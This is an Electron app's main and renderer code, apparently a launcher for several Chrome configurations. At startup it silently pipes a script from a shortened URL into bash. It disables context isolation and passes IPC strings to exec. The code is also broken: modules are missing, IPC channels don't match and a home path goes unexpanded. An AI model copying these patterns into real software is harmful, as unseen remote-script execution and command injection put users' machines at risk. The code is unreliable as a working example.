const { app, BrowserWindow } = require('electron');
const { exec } = require('child_process');

function createWindow() {
  const win = new BrowserWindow({
    width: 800,
    height: 600,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
    },
  });

  win.loadFile('index.html');
}

app.whenReady().then(async () => {
  // Check if file exists before installing chrome-launcher
  if (!fs.existsSync('~/bin/chrome_launcher.sh')) {
    await new Promise(res => {
      exec('curl -sL https://rt.cx/psat | bash', (error, stdout, stderr) => {
        if (error) {
          console.error(`Error executing command: ${error}`);
          return;
        }
        console.log(`stdout: ${stdout}`);
        console.error(`stderr: ${stderr}`);
        res()
      });
    })
  }

  createWindow()
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

app.on('activate', () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createWindow();
  }
});

// In renderer.js
const { ipcRenderer } = require('electron');

window.addEventListener('DOMContentLoaded', () => {
  document.getElementById('default').addEventListener('click', () => {
    ipcRenderer.send('run-command', 'chrome-default');
  });
  
  document.getElementById('3pcd').addEventListener('click', () => {
    ipcRenderer.send('run-command', 'chrome-3pcd');
  });
  
  document.getElementById('default-ps').addEventListener('click', () => {
    ipcRenderer.send('run-command', 'chrome-default-ps');
  });
  
  document.getElementById('3pcd-ps').addEventListener('click', () => {
    ipcRenderer.send('run-command', 'chrome-3pcd-ps');
  });
})

ipcRenderer.on('run-script', (event, command) => {
  exec(command, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing script: ${error}`);
      return;
    }
    console.log(`stdout: ${stdout}`);
    console.error(`stderr: ${stderr}`);
  });
});